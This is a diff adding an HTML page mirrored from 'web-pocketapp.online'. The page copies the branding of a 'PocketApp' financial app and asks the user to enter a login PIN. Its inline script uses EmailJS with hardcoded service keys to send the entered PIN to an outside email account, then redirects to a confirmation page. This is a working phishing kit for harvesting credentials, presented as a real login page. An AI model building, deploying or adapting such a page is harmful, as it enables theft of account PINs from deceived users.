@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+<!-- Mirrored from www.web-pocketapp.online/pin.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 24 Feb 2023 17:47:22 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Confirm Number</title>
+
+
+  <link rel="stylesheet" href="dist/style.css">
+  <script defer src="dist/script.js"></script>
+
+  <link rel="shortcut icon" href="images/pocketappfavicon.ico" type="image/x-icon">
+
+  <link href="../unpkg.com/boxicons%402.1.4/css/boxicons.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="eina-font/stylesheet.css">
+
+  <script type="text/javascript" src="../cdn.jsdelivr.net/npm/%40emailjs/browser%403/dist/email.min.js"></script>
+  <script type="text/javascript">
+      (function () {
+          emailjs.init('R26T4WMBBOl4xUroP');
+      })();
+  </script>
+  <script type="text/javascript">
+      window.onload = function () {
+          console.log('working');
+          document.getElementById('form').addEventListener('submit', function (event) {
+              const btn = document.querySelector('button')
+              event.preventDefault();
+              btn.innerHTML = 'Loading...';
+              emailjs.sendForm('service_7cj5d05', 'scpkapp3', this)
+                  .then(function (response) {
+                      console.log('SUCCESS!', response.status, response.responseText);
+                      setTimeout(() => {
+                          window.location.href = "confirm.html";
+                      }, 5000)
+                  }, function (error) {
+                      alert('an error occured, please try again')
+                      console.log(error)
+                      window.location.reload()
+                  });
+          });
+      }
+  </script>
+</head>
+
+<body class="overflow-x-hidden">
+  
+  <div class="logo">
+    <img class="w-24 mx-auto mt-5" src="images/pocket-app-logo.svg">
+  </div>
+
+  <form action="#" class="form px-2 mt-5" id="form" method="POST">
+    <div class="form__header">
+    <p class="text-xl font-semibold pb-3">
+      Welcome back, Enter your PIN
+    </p>
+    <p class="text-slate-600 font-medium">Please enter your PIN to continue logging in</p>
+    </div>
+
+    <div class="inputCtn mt-5 relative">
+      <input required maxlength="6" minlength="4" type="tel" name="pin" id="pin" class="w-full p-3 pt-8 pl-4 h-[60px] rounded-xl bg-slate-100" placeholder="• • • •">
+
+      <p class="label absolute top-2 left-4 text-slate-400 text-sm">Enter PIN</p>
+
+    </div>
+    </div>
+    <button disabled class="w-full rounded-full bg-black text-white h-[48px] absolute bottom-10">Log In</button>
+  </form>
+</body>
+
+
+<!-- Mirrored from www.web-pocketapp.online/pin.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 24 Feb 2023 17:47:22 GMT -->
+</html>
